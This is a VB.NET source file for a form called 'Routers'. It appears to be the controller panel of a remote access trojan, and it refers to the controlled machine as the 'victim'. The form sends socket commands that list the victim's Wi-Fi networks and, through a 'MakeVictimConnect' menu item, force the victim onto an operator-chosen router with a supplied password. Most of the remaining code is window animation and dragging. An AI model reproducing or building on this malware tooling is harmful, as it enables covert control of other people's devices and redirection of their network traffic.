Public Class Routers
    Public sock As Integer
    Public i As Integer = 0
    Dim Curr As Double = 0.0
    Private Sub wifi_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Timer1.Start()
    End Sub
    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        ListBox1.Items.Clear()
        Main.S.Send(sock, "wifi2")
    End Sub
    Sub Doublekiller()
        Dim networkssid As New List(Of ListViewItem) ' 
        For Each ssid1 As ListViewItem In ListView1.Items ' 
            Dim networkfind As Boolean = False
            For Each ssid2 As ListViewItem In networkssid
                If ssid1.Text = ssid2.Text Then networkfind = True
            Next
            If networkfind = False Then networkssid.Add(ssid1)
        Next
        ListView1.Items.Clear()
        For Each ssid As ListViewItem In networkssid
            ListView1.Items.Add(ssid)
        Next
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If Curr < 588 Then '589
            Curr += 58.9
            Me.Size = New Size(Me.Width, Curr)
        Else
            Timer1.Stop()
            Reforge()
            ListBox1.Items.Clear()
            Main.S.Send(sock, "wifi2")

            Exit Sub
        End If
    End Sub
    Sub Reforge()
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 294)

        Me.Refresh()
    End Sub
    Dim maximized As Boolean
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean

    

    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub
 
 
    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region

    Private Sub MakeVictimConnectToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles MakeVictimConnectToolStripMenuItem.Click
        Try
            Dim result As Integer = MessageBox.Show("This Will Disconnect Client if Client is connected on Wifi", "Connect to Router Alert", MessageBoxButtons.YesNo, MessageBoxIcon.Hand)
            If result = DialogResult.No Then

            ElseIf result = DialogResult.Yes Then
                Dim router, password As String
                router = ListView1.SelectedItems(0).Text
                password = InputBox("Enter password for : " & router, "Connect to Router")
                Main.S.Send(sock, "wificonnect" & Main.Yy & router & Main.Yy & password)
            End If
        Catch ex As Exception
            MsgBox("Error Please Select a Router to connect", MsgBoxStyle.Exclamation)
            Exit Sub
        End Try
      
    End Sub
End Class